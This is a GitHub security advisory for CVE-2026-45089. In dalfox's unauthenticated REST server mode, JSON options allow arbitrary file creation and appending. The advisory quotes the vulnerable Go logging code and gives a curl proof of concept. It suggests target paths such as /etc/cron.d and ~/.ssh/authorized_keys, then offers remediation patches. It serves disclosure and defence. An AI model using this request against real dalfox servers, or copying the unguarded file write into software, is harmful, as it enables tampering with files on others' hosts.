# [H] Dalfox Server Mode has an Unauthenticated Arbitrary File Create/Append via `output` Option

## Summary
Severity: High
Advisory: GHSA-8hf9-3q64-q2qf
CVE: CVE-2026-45089
CWE: CWE-306, CWE-434, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-8hf9-3q64-q2qf
Type: github-advisory

## Affected
- Go: `github.com/hahwul/dalfox/v2` — affected >=0 <2.13.0

## Details
## Summary

When dalfox is run in REST API server mode, the `output`, `output-all`, and `debug` fields in `model.Options` are JSON-tagged and deserialized directly from the attacker's request body, then propagated unchanged through `dalfox.Initialize` into the scan engine's logging path. The logger opens the attacker-supplied path with `os.O_APPEND|os.O_CREATE|os.O_WRONLY` and writes scan log lines to it. Critically, this file write block lives outside the `IsLibrary` guard in `DalLog`, so it executes even in server/library mode where file output was never intended to operate. Because no API key is required in the default configuration, an unauthenticated network caller can create or append to any file writable by the dalfox process on the host filesystem.

## Severity

**High** (CVSS 3.1: 8.2)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`

- **Attack Vector:** Network — server binds to `0.0.0.0:6664` by default.
- **Attack Complexity:** Low — no preconditions; all trigger options (`output`, `output-all`, `debug`) are fully attacker-supplied in the JSON body.
- **Privileges Required:** None — `--api-key` defaults to `""`, so the auth middleware is never registered.
- **User Interaction:** None.
- **Scope:** Unchanged — the file write stays within the dalfox process's OS authority.
- **Confidentiality Impact:** None — this is a write-only primitive; no data is returned to the caller.
- **Integrity Impact:** High — the attacker has full control over which file path is opened, enabling creation of new files or corruption of existing files anywhere the dalfox process has write permission. While the log content format is semi-fixed, the file path is entirely attacker-determined, making the integrity violation complete with respect to file targeting.
- **Availability Impact:** Low — corrupting application configuration files or log files on the host can degrade the availability of other services relying on those files.

## Affected Component

- `cmd/server.go` — `init()` (line 51): `--api-key` defaults to `""` — no auth by default
- `pkg/server/server.go` — `setupEchoServer()` (line 68): auth middleware only registered when `APIKey != ""`
- `pkg/server/server.go` — `postScanHandler()` (lines 173–191): `rq.Options` (including `OutputFile`, `OutputAll`, `Debug`) passed to `ScanFromAPI` without sanitization
- `lib/func.go` — `Initialize()` (line 107): `OutputFile` explicitly propagated from caller options; `OutputAll` (line 167) and `Debug` (line 176) likewise
- `internal/printing/logger.go` — `DalLog()` (lines 230–244): `os.OpenFile(options.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)` executes outside the `IsLibrary` guard

## CWE

- **CWE-306**: Missing Authentication for Critical Function
- **CWE-73**: External Control of File Name or Path
- **CWE-434**: Unrestricted Upload of File with Dangerous Type (write-path variant)

## Description

### `output`, `output-all`, and `debug` Are Fully Attacker-Controlled

`model.Options` exposes all three trigger fields with JSON tags:

```go
// pkg/model/options.go:88,85,88
OutputFile  string `json:"output,omitempty"`
OutputAll   bool   `json:"output-all,omitempty"`
Debug       bool   `json:"debug,omitempty"`
```

`postScanHandler` binds the entire `Req.Options` from the JSON body and passes it directly to `ScanFromAPI`:

```go
// pkg/server/server.go:173-191
rq := new(Req)
if err := c.Bind(rq); err != nil { ... }
go ScanFromAPI(rq.URL, rq.Options, *options, sid)
```

`Initialize` explicitly copies all three fields into `newOptions`:

```go
// lib/func.go:107, 167, 176
"OutputFile": {&newOptions.OutputFile, options.OutputFile},
...
"OutputAll":  {&newOptions.OutputAll, options.OutputAll},
...
"Debug":      {&newOptions.Debug, options.Debug},
```

### The File Write Is Not Guarded by `IsLibrary`

`Initialize` always sets `IsLibrary: true` (line 20) and `Silence: true` (line 44) in its returned options — the intent being that the scan engine runs in embedded/library mode during API calls, suppressing terminal I/O. `DalLog` does respect this for stderr output: lines 203–228 route logs to `ScanResult.Logs` (not stderr) when `IsLibrary` is true. However, the file write block at lines 230–244 is positioned **after and outside** that `if-else`:

```go
// internal/printing/logger.go
mutex.Lock()
if options.IsLibrary {
    options.ScanResult.Logs = append(options.ScanResult.Logs, text)  // API path
} else {
    // stderr printing (CLI path)
}

// ← file write is here, unconditionally — no IsLibrary check
if options.OutputFile != "" {
    var fdtext string
    if ftext != "" {
        fdtext = ftext
        f, err := os.OpenFile(options.OutputFile,
            os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
            fmt.Fprintln(os.Stderr, "output file error (file)")
        }
        defer f.Close()
        if _, err := f.WriteString(fdtext + "\n"); err != nil {
            fmt.Fprintln(os.Stderr, "output file error (write)")
        }
    }
}
mutex.Unlock()
```

The `ftext` variable is populated whenever `allWrite` is true (`options.Debug || options.OutputAll`). Since both are attacker-supplied, both conditions are trivially satisfied.

### What Gets Written

Log lines of the form:

```
[*] Starting scan [SID:<id>] / URL: <attacker-supplied-url>
[I] Checking BAV
[E] connection refused
[DEBUG] <internal state>
...
```

The URL appears verbatim in log messages, giving the attacker partial influence over the written content. While the format is not fully arbitrary (fixed prefixes like `[*] `, `[I] `, `[E] `), the **file path is entirely attacker-controlled**. The flags `O_CREATE` (creates the file if absent) and `O_APPEND` (never truncates) mean the attacker can:
- Create new files at arbitrary paths
- Append log content to existing files (corrupting configs, auth files, cron entries if the line happens to match syntax)

### No Defense at Any Layer

The same opt-in API key gap applies here as in all prior findings:

```go
// pkg/server/server.go:68-70
if options.ServerType == "rest" && options.APIKey != "" {
    e.Use(apiKeyAuth(options.APIKey, options))
}
```

There is no path allowlist, no `IsLibrary` guard on the file write, and no stripping of `OutputFile` from API-sourced requests anywhere in the codebase.

## Proof of Concept

```bash
# Step 1 — Start dalfox REST server (default: no API key)
go run . server --host 127.0.0.1 --port 16664 --type rest

# Step 2 — Verify health (unauthenticated)
curl -s http://127.0.0.1:16664/health
# Expected: {"code":200,"msg":"ok"}

# Step 3 — Trigger arbitrary file creation with attacker-controlled path
curl -s -X POST http://127.0.0.1:16664/scan \
  -H 'Content-Type: application/json' \
  --data '{
    "url": "http://127.0.0.1:1/?x=1",
    "options": {
      "output": "/tmp/dalfox_sink_poc.log",
      "output-all": true,
      "debug": true,
      "use-headless": false
    }
  }'

# Step 4 — Verify file was created and written to by the dalfox process
sleep 2
cat /tmp/dalfox_sink_poc.log
# Expected:
# [*] Starting scan [SID:...] / URL: http://127.0.0.1:1/?x=1
# [I] Checking BAV
# [E] ...
```

No `X-API-KEY` header is required. Replace `/tmp/dalfox_sink_poc.log` with any path writable by the dalfox process: `/var/www/html/injected.txt`, `/etc/cron.d/dalfox`, `~/.ssh/authorized_keys` (appending log lines that won't break key format but pollute the file), etc.

## Impact

- **Arbitrary file creation**: The attacker can create files at any path on the dalfox host filesystem accessible to the dalfox process, including web-serving directories, cron drop-in directories, and application config directories.
- **Arbitrary file append/corruption**: Existing files can have log-format lines appended, degrading parsers that expect strict formats (sshd_config, crontab, /etc/hosts, application config files).
- **Partial content control via URL**: The scan target URL appears verbatim in log output; combined with creative path targeting, this may enable injection into certain file formats.
- **No authentication required** in the default deployment.
- When dalfox runs under a privileged account (e.g., in a CI pipeline or as root in a container), the blast radius extends to system-wide files.

## Recommended Remediation

### Option 1: Strip filesystem-dangerous fields from API-sourced requests (preferred)

Nullify all fields that touch the local filesystem before passing options to `ScanFromAPI`. This is the same remediation recommended for the `found-action` RCE and `custom-payload-file` file-read findings and should be applied as a single consolidated patch:

```go
// pkg/server/server.go — in postScanHandler, before ScanFromAPI:
rq.Options.OutputFile = ""
rq.Options.OutputAll = false          // safe to leave user value; file write is blocked by OutputFile=""
rq.Options.CustomPayloadFile = ""
rq.Options.CustomBlindXSSPayloadFile = ""
rq.Options.FoundAction = ""
rq.Options.FoundActionShell = ""
rq.Options.HarFilePath = ""
```

### Option 2: Guard the file write with `IsLibrary` in `DalLog`

Move the `OutputFile` write block inside the `else` branch so it only executes in non-library (CLI) mode:

```go
// internal/printing/logger.go — restructure the if-else:
if options.IsLibrary {
    options.ScanResult.Logs = append(options.ScanResult.Logs, text)
} else {
    // existing stderr printing logic...

    // file write belongs here, not after the if-else
    if options.OutputFile != "" && ftext != "" {
        f, err := os.OpenFile(options.OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        ...
    }
}
```

This fix addresses the root structural cause — the file write was intended for CLI mode only, and gating it on `!IsLibrary` matches that intent. Option 1 is still recommended as the primary fix; Option 2 adds defence-in-depth but requires care to not break legitimate CLI usage.

### Option 3: Require `--api-key` at server startup

As with the other server-mode findings, making authentication mandatory eliminates the unauthenticated attack surface entirely:

```go
// cmd/server.go — in runServerCmd:
if serverType == "rest" && apiKey == "" {
    fmt.Fprintln(os.Stderr, "ERROR: --api-key is required when running in REST server mode.")
    os.Exit(1)
}
```

All three options should be applied together.

##Credit

Emmanuel David

Github:- https://github.com/drmingler.

## References
- https://github.com/hahwul/dalfox/security/advisories/GHSA-8hf9-3q64-q2qf
- https://nvd.nist.gov/vuln/detail/CVE-2026-45089
- https://github.com/hahwul/dalfox
- https://github.com/hahwul/dalfox/releases/tag/v2.13.0
